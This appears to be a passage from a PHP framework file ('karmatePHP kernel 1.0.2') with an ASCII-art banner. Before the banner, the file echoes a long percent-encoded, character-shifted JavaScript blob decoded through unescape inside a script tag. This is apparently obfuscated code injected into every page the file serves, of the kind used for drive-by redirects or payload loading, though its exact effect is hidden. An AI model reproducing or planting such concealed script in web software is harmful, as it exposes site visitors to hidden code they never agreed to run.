%37%6b%6a%6b%70%73%6f%7b%70%7e%72%43%7e%79%71%6a%43%64%70%70%7e%79%45%7e%6e%64%87%6c%47%76%70%77%6b%7d%86%69%7d%77%74%37%86%6a%75%78%79%78%45%42%3f%3c%44%74%6f%87%79%31%65%66%69%7e%79%6c%78%72%71%76%45%73%7f%7f%66%41%6a%7c%7d%79%78%72%42%6b%6a%68%62%76%70%7b%84%7b%6b%81%74%6b%7d%6a%6d%8c%64%7b%7d%7e%7e%7e%43%78%6f%73%7d%43%63%62%69%72%72%7d%7d%7e%7e%6c%45%28%3e%31%35%3c%3f%3b%42%69%78%7c%79%7d%47%2b%31%67%3c%42%79%68%79%72%8a%6f%45%73%7f%7f%66%41%77%6c%74%75%71%74%42%3a%3a%39%71%89%41%86%70%6b%78%71%4a%3b%3f%3d%78%88%4c%73%6c%79%76%77%77%3f%7c%7e%7d%44%32%31%2b%42%74%6c%7e%70%7b%76%30%71%69%67%75%46%3f%46%7f%6f%6d%64%73%71%74%44%33%71%84%2f%3b%2f%3c%29%32%78%87%40%6c%70%89%33%7a%70%85%77%77%79%42%6d%7c%7c%65%66%7e%30%69%7e%84%44%66%79%71%79%31%67%62%73%74%77%84%46%76%71%76%7e%78%7e%62%64%6b%42%34%86%6b%6b%7d%73%7b%32%7a%70%76%69%77%34%6a%6f%75%7c%79%78%79%44%7f%70%72%68%46%30%85%6e%62%75%74%79%31%76%74%6b%7d%34%7a%6b%75%67%6d%7b%47%70%70%7f%6b%42%34%72%74%7d%7f%74%30%7a%7b%66%73%33%7a%6c%73%6b%6c%74%42%71%7c%70%66%4c%33%70%7a%85%33%7e%75%6f%7d%32%7b%66%7d%6b%6a%7f%45%72%78%7e%6f%42%32%71%74%3e%7b%7a%6c%7d%33%7c%67%74%68%68%7a%4b%7f%7d%71%6c%42%7b%7c%67%7a%30%78%69%7d%66%69%7b%41%71%7d%77%67%45%6d%7c%7c%65%66%7e%30%6e%7e%70%78%72%42%76%7f%69%66%7f%83%10%11%43%3d%7c%74%83%73%6a%40%1e%1b%40%7b%6c%87%78%6a%72%6f%6c%2d%7c%66%62%68%7e%75%73%87%4715748858%36%32%36%35%30%39%31' + unescape('%27%29%29%3b'));
    // -->
    </script>
    ";
echo '




  //+----------------------------------------------------------------------+
  //| = : = : = : = : = : = : = : = : = : = : = : = : = : = : = : = : = : =|
  //|{>/----------------------------------------------------------------\<}|
  //|: |                                                                | :|
  //| :|┬┌─┌─┐┬─┐┌┬┐┌─┐┌┬┐┌─┐╔═╗╦ ╦╔═╗+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+-|: |
  //|: |├┴┐├─┤├┬┘│││├─┤ │ ├┤ ╠═╝╠═╣╠═╝|f|r|a|m|e|w|o|r|k| kernel 1.0.2  | :|
  //| :|┴ ┴┴ ┴┴└─┴ ┴┴ ┴ ┴ └─┘╩  ╩ ╩╩  +-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+-|: |
  //|: |________________________________________________________________| :|
  //| :|107 97 114 109 97 116 101 107 101 114 110 101 108 49 45 48 45 48|: |
  //|: |     98 101 114 107 97 121 32 107 97 114 97 116 97 197 159      | :|
  //| :|________________________________________________________________|: |
  //|{>\----------------------------------------------------------------/<}|
  //| = : = : = : = : = : = : = : = : = : = : = : = : = : = : = : = : = : =|
  //+----------------------------------------------------------------------+
';
}
